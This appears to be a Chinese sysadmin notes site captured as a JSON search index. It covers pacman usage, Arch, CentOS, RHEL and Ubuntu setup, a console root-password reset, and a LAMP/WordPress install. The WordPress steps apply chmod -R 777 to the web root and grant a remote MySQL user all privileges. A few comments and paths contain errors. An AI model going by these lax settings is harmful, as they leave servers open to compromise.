在显示一些操作信息后执行安装。 pacman -Sv 软件名 只下载软件包，不安装。 pacman -Sw 软件名 安装本地软件包。 pacman -U 软件名.pkg.tar.gz 安装一个远程包（不在 pacman 配置的源里面）。 pacman -U http://www.example.com/repo/example.pkg.tar.xz 更新系统 从服务器下载新的软件包数据库（实际上就是下载远程仓库最新软件列表到本地）。 pacman -Sy 升级所有已安装的软件包。 pacman -Su pacman 可以用一个命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包： pacman -Syu 在msys2中 pacman -Syu后需要重启一下msys2(关掉shell重新打开即可)。 在Arch linux中，只支持系统完整升级，不支持部分升级。所以即使在msys2中，pacman -Syu也会升级整个系统。可以观察一下，即使新安装的msys2，pacman -Syu后，msys2安装目录占用空间立马变大很多。 如果升级时，网络比较慢，觉得既浪费时间又浪费硬盘，实在不想升级那么多东西，可以逐个软件包升级。用下面命令可以升级核心包： pacman -S --needed filesystem msys2-runtime bash libreadline libiconv libarchive libgpgme libcurl pacman ncurses libintl 卸载软件 该命令将只删除包，保留其全部已经安装的依赖关系 pacman -R 软件名 删除软件，并显示详细的信息 pacman -Rv 软件名 删除软件，同时删除本机上只有该软件依赖的软件。 pacman -Rs 软件名 删除软件，并删除所有依赖这个软件的程序，慎用 pacman -Rsc 软件名 删除软件,同时删除不再被任何软件所需要的依赖 pacman -Ru 软件名 搜索软件 在仓库中搜索含关键字的软件包（本地已安装的会标记） pacman -Ss 关键字 显示软件仓库中所有软件的列表，可以省略，通常这样用:pacman -Sl | 关键字 pacman -Sl 搜索已安装的软件包 pacman -Qs 关键字 列出所有可升级的软件包 pacman -Qu 列出不被任何软件要求的软件包 pacman -Qt 参数加q可以简洁方式显示结果，比如pacman -Ssq gcc会比pacman -Ss gcc显示的好看一些。 pacman -Sl | gcc跟pacman -Ssq gcc很接近，但是会少一些和gcc有关但软件名不包含gcc的包。 查询软件信息 查看软件包是否已安装，已安装则显示软件包名称和版本 pacman -Q 软件名 查看某个软件包信息，显示较为详细的信息，包括描述、构架、依赖、大小等等 pacman -Qi 软件名 列出软件包内所有文件，包括软件安装的每个文件、文件夹的名称和路径 pacman -Ql 软件名 清理缓存 清理未安装的包文件，包文件位于 /var/cache/pacman/pkg/ 目录。 pacman -Sc 清理所有的缓存文件。 pacman -Scc yay Yet Another Yogurt: 一个用于 Arch Linux 的工具，用于从 Arch User Repository 中构建和安装软件包。 另见 pacman。 从仓库和 AUR 中交互式搜索和安装软件包： yay {{软件包|搜索词}} 同步并更新所有来自仓库和 AUR 的软件包： yay 只同步和更新 AUR 软件包： yay -Sua 从仓库和 AUR 中安装一个新的软件包。 yay -S {{软件包}} 从仓库和 AUR 中搜索软件包数据库中的关键词： yay -Ss {{关键词}} 显示已安装软件包和系统健康状况的统计数据： yay -Ps 最常用的pacman命令小结 pacman命令较多，作为新手，将个人最常用的命令总结如下： pacman -Syu: 升级系统及所有已经安装的软件。 pacman -S 软件名: 安装软件。也可以同时安装多个包，只需以空格分隔包名即可。 pacman -Rs 软件名: 删除软件，同时删除本机上只有该软件依赖的软件。 pacman -Ru 软件名: 删除软件，同时删除不再被任何软件所需要的依赖。 pacman -Ssq 关键字: 在仓库中搜索含关键字的软件包，并用简洁方式显示。 pacman -Qs 关键字: 搜索已安装的软件包。 pacman -Qi 软件名: 查看某个软件包信息，显示软件简介,构架,依赖,大小等详细信息。 pacman -Sg: 列出软件仓库上所有的软件包组。 pacman -Sg 软件包组: 查看某软件包组所包含的所有软件包。 pacman -Sc：清理未安装的包文件，包文件位于 /var/cache/pacman/pkg/ 目录。 pacman -Scc：清理所有的缓存文件。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:55 "},"2.系统运维/Arch安装问题.html":{"url":"2.系统运维/Arch安装问题.html","title":"Arch安装问题","keywords":"","body":"一、无法识别声卡 sudo pacman -S sof-firmware reboot 二、无法识别摄像头 ``` # 三、常用软件 ```shell # WPS中文版+字体 sudo pacman -S wps-office-cn wps-office-mime-cn wps-office-mui-zh-cn wps-office-fonts ttf-ms-fonts ttf-wps-fonts 四、安装微软字体 方法一： 准备 PKGBUILD Archlinux 中 AUR – ttf-ms-win10 提供了 PKGBUILD git clone https://aur.archlinux.org/ttf-ms-win10.git 您可以编辑 PKGBUILD 添加 simfang.ttf simhei.ttf simkai.ttf，或直接从 此处 获取 从 Windows 10 中复制字体文件 将 Windows/Fonts 中所有文件和 Windows/System32 中的 license.rtf 复制到 ttf-ms-win10 文件夹中 您也可以从文末链接中下载博主从 Windows 中打包的字体压缩包，解压到 ttf-ms-win10 中即可 安装软件包 在 ttf-ms-win10 目录下，执行 makepkg --skipchecksums 由于 Windows 10 内部版本不同，使用 --skipchecksums 跳过文件校验 刷新字体缓存 fc-cache 方法二：（推荐） 获取字体 windwos中获取微软雅黑字体，在C:\\Windows\\Fonts下拷贝微软雅黑字体 拷贝字体到Linux系统中，在 /usr/share/fonts/ 下新建 msyh 文件夹 cd /usr/share/fonts/ sudo mkdir msyh 拷贝字体到msyh文件夹 sudo cp path/*ttc /usr/share/fonts/msyh 执行命令 cd /usr/share/fonts/msyh sudo mkfontscale sudo mkfontdir 刷新字体 fc-cache 刷新系统字体 fc-cache -fv 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:43 "},"2.系统运维/Arch桌面替换KDE为GNOME.html":{"url":"2.系统运维/Arch桌面替换KDE为GNOME.html","title":"Arch桌面替换KDE为GNOME","keywords":"","body":"[feiyu@Manjaro ~ ]$ sudo pacman -S gnome gnome-extra :: 在组 gnome 中有 59 成员： :: 软件仓库 extra 1) baobab 2) epiphany 3) evince 4) gdm 5) gnome-backgrounds 6) gnome-calculator 7) gnome-calendar 8) gnome-characters 9) gnome-clocks 10) gnome-color-manager 11) gnome-connections 12) gnome-console 13) gnome-contacts 14) gnome-control-center 15) gnome-disk-utility 16) gnome-font-viewer 17) gnome-keyring 18) gnome-logs 19) gnome-maps 20) gnome-menus 21) gnome-music 22) gnome-remote-desktop 23) gnome-session 24) gnome-settings-daemon 25) gnome-shell 26) gnome-shell-extensions 27) gnome-software 28) gnome-system-monitor 29) gnome-text-editor 30) gnome-tour 31) gnome-user-docs 32) gnome-user-share 33) gnome-weather 34) grilo-plugins 35) gvfs 36) gvfs-afc 37) gvfs-dnssd 38) gvfs-goa 39) gvfs-google 40) gvfs-gphoto2 41) gvfs-mtp 42) gvfs-nfs 43) gvfs-onedrive 44) gvfs-smb 45) gvfs-wsdd 46) loupe 47) malcontent 48) nautilus 49) orca 50) rygel 51) simple-scan 52) snapshot 53) sushi 54) tecla 55) totem 56) tracker3-miners 57) xdg-desktop-portal-gnome 58) xdg-user-dirs-gtk 59) yelp 输入某个选择 ( 默认=全部选定 ): :: 在组 gnome-extra 中有 47 成员： :: 软件仓库 extra 1) accerciser 2) cheese 3) d-spy 4) dconf-editor 5) devhelp 6) endeavour 7) eog 8) evolution 9) file-roller 10) five-or-more 11) four-in-a-row 12) geary 13) gedit 14) ghex 15) gitg 16) glade 17) gnome-2048 18) gnome-boxes 19) gnome-builder 20) gnome-chess 21) gnome-devel-docs 22) gnome-dictionary 23) gnome-games 24) gnome-klotski 25) gnome-mahjongg 26) gnome-mines 27) gnome-multi-writer 28) gnome-nibbles 29) gnome-notes 30) gnome-photos 31) gnome-recipes 32) gnome-robots 33) gnome-sound-recorder 34) gnome-sudoku 35) gnome-taquin 36) gnome-terminal 37) gnome-tetravex 38) gnome-tweaks 39) hitori 40) iagno 41) lightsoff 42) polari 43) quadrapassel 44) seahorse 45) swell-foop 46) sysprof 47) tali 输入某个选择 ( 默认=全部选定 ): 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:55 "},"2.系统运维/Centos常用软件包安装.html":{"url":"2.系统运维/Centos常用软件包安装.html","title":"Centos常用软件包安装","keywords":"","body":"1、htop sudo yum install epel-release -y && sudo yum install htop -y 2、nginx sudo rpm -ivh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm && sudo yum install -y nginx 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:55 "},"2.系统运维/Centos开启VirtualBox增强模式.html":{"url":"2.系统运维/Centos开启VirtualBox增强模式.html","title":"Centos开启VirtualBox增强模式","keywords":"","body":"问题 运行安装程序报错找不到kernel-header 1、更新kernel内核版本 sudo yum update kernel -y 2、安装kernel header sudo yum install kernel-headers kernel-devel gcc make -y 3、运行安装程序 双击打开桌面增强的iso文件，右键文件空白处打开终端， 运行： sudo sh VBoxLinuxAdditions.run 成功！ 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:45 "},"2.系统运维/RHEL8搭建DNS服务器.html":{"url":"2.系统运维/RHEL8搭建DNS服务器.html","title":"RHEL8搭建DNS服务器","keywords":"","body":"一、主要配置文件 主程序名：/usr/sbin/named 主配置文件：/etc/named.conf 区域配置文件：/etc/named.rfc1912.zones 正反向解析文件路径(名字可以自己随意设置)：/var/named/ 如：正向解析区域文件：xxx.com.zone 反向解析区域文件：xxx.com.arpa 二、准备工作 环境：两台红帽8.2；前提，做DNS服务器的系统必须已搭建完本地yum源，用于下载bind；两台虚拟机之间能够互相通信。 安装bind：sudo yum install bind* -y 三、开始搭建 注：本次搭建需要操作的文件全部都需要root权限才能修改，若不是root用户，记得用sudo命令。 修改配置文件/etc/named.conf 编辑区域信息配置文件 /etc/named.rfc1912.zones 注：直接在文件最后追加区域信息即可 ​ a. 其中type是服务类型有三种：hint（根区域）、master（主区域）、slave（辅助区域） ​ b. 其中file是域名与IP地址解析规则保存的文件地址。 ​ c. 其中allow-update是允许那些客户机动态更新解析信息，在配置从DNS服务器时使用。 编辑正向解析信息 注意区域文件中的file信息位置，在/var/named/文件夹下创建对应名字的文件“hehe.com.zone”, \"172.16.100.arpa\"。 [root@localhost ~]# cd /var/named/ [root@localhost named]# ls -al named.localhost -rw-r-----. 1 root named 152 Aug 25 01:31 named.localhost [root@localhost named]# cp -a named.localhost hehe.com.zone #注意此处使用-a选项的意义，为了连同named.localhost文件的文件属组信息一起复制出来，若没使用-a，后续可以用chown命令为相应文件进行修改。 [root@localhost named]# vim hehe.com.zone 对“hehe.com.zone”进行修改，二级域名c1的意思为“c1.hehe.com”，A记录即为ipv4记录。 编辑反向解析信息[root@localhost ~]# cd /var/named/ [root@localhost named]# ls -al named.loopback -rw-r-----. 1 root named 152 Aug 25 01:31 named.loopback [root@localhost named]# cp -a named.loopback 172.16.100.arpa [root@localhost named]# vim 172.16.100.arpa 测试配置文件是否出错 用named-checkzone命令对正向解析区域和反向解析区域进行测试是否有错。 named-checkzone 文件名 /var/named/文件名 四、测试 重启DNS服务，查看状态 [root@localhost named]# systemctl restart named //重启服务 [root@localhost named]# systemctl status named //查看运行状态 测试 使用另一台linux主机（客户端），编辑/etc/resolv.conf文件，添加一条解析记录指向DNS服务器IP： 用nslookup命令测试，出现以下两条信息说明正向和反向解析都已成功，此时使用ping命令pingDNS服务器域名也可ping通。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/RHEL8搭建本地yum源.html":{"url":"2.系统运维/RHEL8搭建本地yum源.html","title":"RHEL8搭建本地yum源","keywords":"","body":"一、前言 一台红帽linux虚拟机，一个红帽dvd镜像(iso)。 二、开始搭建 创建需要进行挂载的目录，并进行挂载 mkdir /mnt/cdrom #挂载点目录 mount /dev/src0 /mnt/cdrom 创建repo文件 编辑/etc/yum.repo.d/local.repo文件，填入以下内容： [BaseOS] name=BaseOS baseurl=file:///mnt/cdrom/BaseOS # 挂载点目录/BaseOS enabled=1 gpgcheck=0 [AppStream] name=AppStream baseurl=file:///mnt/cdrom/AppStream # 挂载点目录/AppStream enabled=1 gpgcheck=0 redhat8中，所有rpm包都被拆分为BaseOS和AppStream两个目录，BaseOS里面存放一些基础应用，AppStream里面存放其他的应用。两个都要配置，才能安装全部的iso里的软件。 验证是否可用 清理并刷新yum缓存 yum clean all # 清理yum缓存 yum repolist # 刷新yum缓存 随意安装一个引用如vim，看源是否可用 三、配置开机自动挂载（选做） 用blkid命令查看光盘文件属性，可以看到TYPE=\"iso9660\"和UUID=\"2022-06-29-06-15-46-00\" [aaa@localhost yum.repos.d]$ blkid /dev/sr0: UUID=\"2022-06-29-06-15-46-00\" LABEL=\"RHEL-8-2-0-BaseOS-x86_64\" TYPE=\"iso9660\" PTUUID=\"72cfe76b\" PTTYPE=\"dos\" [aaa@localhost yum.repos.d]$ 编辑/etc/fstab文件 写入以下内容： /dev/sr0 /mnt/cdrom iso9660 defaults 0 0 或者 UUID=2022-06-29-06-15-46-00 /mnt/cdrom iso9660 defaults 0 0 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/RHEL8重置Root密码.html":{"url":"2.系统运维/RHEL8重置Root密码.html","title":"RHEL8重置Root密码","keywords":"","body":" 关机重启，按e键进入内核编辑程序 找到指定位置输入rd.break，按Ctrl+X运行修改后的内核程序 3、依次输入以下命令，输入reboot重启 mount -o remount,rw /sysroot # 将文件系统以只读方式挂载在`/sysroot`目录下 chroot /sysroot # 进入chroot环境，让我们对系统文件进行安全的更改 passwd # 更改新密码 touch /.autorelabel # 让下一次系统引导时启用SELinux重新标记进程，登录成功的关键 exit # 退出chroot模式 reboot # 重启系统 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:42 "},"2.系统运维/Ubuntu常用软件包安装.html":{"url":"2.系统运维/Ubuntu常用软件包安装.html","title":"Ubuntu常用软件包安装","keywords":"","body":"1、bash命令补全工具 sudo apt-get -y install bash-completion # 在用户的shell中运行 source /etc/bash_completion 2、docker #卸载操作系统默认安装的docker， sudo apt-get remove docker docker-engine docker.io containerd runc #安装必要支持 sudo apt-get install apt-transport-https ca-certificates curl software-properties-common gnupg lsb-release -y #添加 Docker 官方 GPG key # Ubuntu curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg #Debian curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | apt-key add - #添加 apt 源: # Ubuntu echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null #Debian add-apt-repository \"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian $(lsb_release -cs) stable\" #更新源 sudo apt-get update #安装最新版本的Docker # Ubuntu sudo apt-get install docker-ce docker-ce-cli containerd.io -y #Debian apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y 2）允许非Root用户执行docker 命令 # 添加docker用户组 sudo groupadd docker # 将当前用户添加到用户组 sudo usermod -aG docker $USER # 使权限生效 newgrp docker #如果没有此行命令，你会发现，当你每次打开新的终端 #你都必须先执行一次 “newgrp docker” 命令 #否则当前用户还是不可以执行docker命令 groupadd -f docker 3）配置docker镜像加速 sudo tee > /etc/docker/daemon.json 3、docker-compose # pip3安装（此方法不适用于Ubuntu22.04tls） sudo apt-get -y install python3-pip sudo pip3 install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple sudo pip3 install docker-compose -i https://pypi.tuna.tsinghua.edu.cn/simple # 软件包安装 cd /usr/local/bin/ sudo wget https://github.com/docker/compose/releases/download/v2.27.1/docker-compose-linux-x86_64 mv docker-compose-linux-x86_64 docker-compose sudo chmod +x docker-compose 4、Nginx # 安装相关依赖 sudo apt install -y curl gnupg2 ca-certificates lsb-release # 安装Nginx sudo apt install -y nginx 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:51 "},"2.系统运维/Ubuntu系统网站搭建[LAMP].html":{"url":"2.系统运维/Ubuntu系统网站搭建[LAMP].html","title":"Ubuntu系统网站搭建[LAMP]","keywords":"","body":"前言 环境：Ubuntu 20.04 TLS 准备搭建环境：LAMP（Linux + Apache + Mysql + PHP） 搭建LAMP环境 1、安装Apache sudo apt-get install apache2 -y 验证：如果是本地主机，可以在浏览器输入127.0.0.1；如果是云服务器，可以再浏览器输入服务器提供商给的IP地址，出现以下界面则表示安装成功： 2、安装php sudo apt-get install php libapache2-mod-php -y sudo systemctl restart apache2 #重启apache服务 这里安装libapache2-mod-php的主要的原因是因为 libapache2-mod-php libapache2-mod-php 验证：在apache默认网页文件路径（/var/ww/html/）下创建一个文件1.php，输入以下内容 保存退出，在浏览器输入http://IP地址/1.php，出现以下界面，表示安装成功 3、安装MySQL及其相关php组件 sudo apt-get install mysql -y #安装mysql sudo apt-get install php-mysql #安装php相关组件 4、安装phpmyadmin（可视化数据库管理界面） sudo apt-get install phpmyadmin -y sudo ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin #建立 /var/www/html 下的软连接 sudo systemctl restart mysql #重启 MySQL 服务 sudo systemctl restart apache2.service #重启 Apache 服务 创建软链接的目的是让我们在进入phpmyadmin时更加的方便一点，只要在浏览器输入http://IP地址/phpmyadmin 创建wordpress数据库 mysql -u root -p #进入mysqlroot账户，初次进入会设置密码 CREATE DATABASE 数据库名称; #创建数据库 CREATE USER ‘用户名’@‘%’ IDENTIFIED BY ‘密码’; #创建用户（远程用户）并设置密码用于连接wordpress GRANT ALL PRIVILEGES ON 数据库名称.* TO ‘用户名’@‘%'; #给创建的用户权限 FLUSH PRIVILEGES; #生效设置 exit; #退出 输入命令时注意最后的‘；’号，还有在赋权时数据库名称后面的‘.*’，创建成功之后可以进入phpmyadmin后台验证是否能够登录。 wordpress下载配置 进入wordpress官网[icon-url href=\"https://cn.wordpress.org/download/\"]找到（下载.tar.gz）,右键复制下载链接； 在linux终端输入 wget 复制的链接 tar -zxvf 压缩包名 sudo wget https://cn.wordpress.org/latest-zh_CN.tar.gz sudo tar -zxvf latest-zh_CN.tar.gz 先将apache目录下的index.php进行重命名（目的是改变Apache默认打开的网页） sudo mv /var/www/html/index.html /var/www/html/index~.html 再将解压的wordpress文件全部移动到Apache文件目录下 sudo mv wordpress/* /var/www/html/ 然后给html下的文件进行赋权限 sudo chmod -R 777 /var/www/html/ #shiji实际上不用这么高的权限，但是我这里图个方便直接给最高权限 重启Apache服务，配置完成 sudo systemctl restart apache2 配置完后，即可进入浏览器配置网站的相关配置了，在浏览器输入IP地址，进入wordpress配置，按照要求填写之前创建的数据库信息，和网站信息，完成后你就能拥有一个属于自己的网站了[撒花][撒花][撒花] 结语 到这里我们已经拥有了自己的网站了，但是这样子并不算已经上线，因为我们还没有域名，下一步我们将会给网站链接一个域名，实现域名访问[期待]。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:49 "},"2.系统运维/Ubuntu镜像源加速.html":{"url":"2.系统运维/Ubuntu镜像源加速.html","title":"Ubuntu镜像源加速","keywords":"","body":"前言 镜像源文件位置/etc/apt/sources.list ## 基础源 deb 镜像源地址 版本名 main restricted universe multiverse deb-src 镜像源地址 版本名 main restricted universe multiverse deb 镜像源地址 版本名-updates main restricted universe multiverse deb-src 镜像源地址 版本名-updates main restricted universe multiverse deb 镜像源地址 版本名-backports main restricted universe multiverse deb-src 镜像源地址 版本名-backports main restricted universe multiverse ## 安全更新源，包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb 镜像源地址 版本名-security main restricted universe multiverse deb-src 镜像源地址 版本名-security main restricted universe multiverse ## 预发布软件源，不建议启用 # deb 镜像源地址 版本名-proposed main restricted universe multiverse # deb-src 镜像源地址 版本名-proposed main restricted universe multiverse 一、阿里云镜像加速（全版本） ubuntu 14.04 LTS (trusty) (EOL) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse ## Not recommended # deb https://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse ubuntu 16.04 LTS (xenial) (EOL) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ xenial main deb-src https://mirrors.aliyun.com/ubuntu/ xenial main deb https://mirrors.aliyun.com/ubuntu/ xenial-updates main deb-src https://mirrors.aliyun.com/ubuntu/ xenial-updates main deb https://mirrors.aliyun.com/ubuntu/ xenial universe deb-src https://mirrors.aliyun.com/ubuntu/ xenial universe deb https://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb-src https://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb https://mirrors.aliyun.com/ubuntu/ xenial-security main deb-src https://mirrors.aliyun.com/ubuntu/ xenial-security main deb https://mirrors.aliyun.com/ubuntu/ xenial-security universe deb-src https://mirrors.aliyun.com/ubuntu/ xenial-security universe ubuntu 18.04 LTS (bionic) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse ubuntu 20.04 LTS (focal) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse ubuntu 22.04 LTS (jammy) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse ubuntu 23.04 (lunar) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ lunar main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ lunar-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ lunar-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ lunar-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ lunar-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ lunar-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ lunar-backports main restricted universe multiverse ubuntu 24.04 (noble) 配置如下 deb https://mirrors.aliyun.com/ubuntu/ noble main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ noble-security main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble-security main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ noble-updates main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble-updates main restricted universe multiverse # deb https://mirrors.aliyun.com/ubuntu/ noble-proposed main restricted universe multiverse # deb-src https://mirrors.aliyun.com/ubuntu/ noble-proposed main restricted universe multiverse deb https://mirrors.aliyun.com/ubuntu/ noble-backports main restricted universe multiverse deb-src https://mirrors.aliyun.com/ubuntu/ noble-backports main restricted universe multiverse 二、清华镜像加速（全版本） ubuntu 14.04 LTS (trusty) (EOL) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ trusty-proposed main restricted universe multiverse ubuntu 16.04 LTS (xenial) (EOL) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse ubuntu 18.04 LTS (bionic) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse ubuntu 20.04 LTS (focal) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb 